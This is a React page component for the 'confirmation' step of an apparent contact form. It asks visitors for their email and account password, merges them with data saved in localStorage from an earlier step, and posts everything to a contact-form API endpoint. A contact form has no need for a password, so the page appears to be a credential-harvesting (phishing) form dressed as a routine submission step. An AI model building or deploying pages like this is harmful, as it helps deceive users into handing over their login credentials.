import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { confirmationFormSchema } from "@/lib/form-schemas";
import { apiRequest } from "@/lib/queryClient";
import MetaTags from "@/components/meta-tags";
import { useToast } from "@/hooks/use-toast";

export default function Confirmation() {
  const [_, navigate] = useLocation();
  const { toast } = useToast();
  
  const form = useForm({
    resolver: zodResolver(confirmationFormSchema),
    defaultValues: {
      user_email: "",
      password: ""
    }
  });

  async function onSubmit(data: any) {
    try {
      const validationData = JSON.parse(localStorage.getItem('validation_data') || '{}');
      const formData = { ...validationData, ...data };
      
      await apiRequest('POST', '/api/contact-form', formData);
      
      localStorage.removeItem('validation_data');
      toast({
        title: "Success!",
        description: "Your form has been submitted"
      });
      navigate("/success");
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive"
      });
    }
  }

  return (
    <>
      <MetaTags 
        title="Contact Form | Confirmation"
        description="Please confirm your details"
      />
      
      <div className="container max-w-lg mx-auto py-12">
        <Card>
          <CardHeader>
            <CardTitle>Confirmation Details</CardTitle>
          </CardHeader>
          <CardContent>
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <FormField
                  control={form.control}
                  name="user_email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Email</FormLabel>
                      <FormControl>
                        <Input type="email" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={form.control}
                  name="password"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Password</FormLabel>
                      <FormControl>
                        <Input type="password" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <Button type="submit" className="w-full">Submit</Button>
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
    </>
  );
}
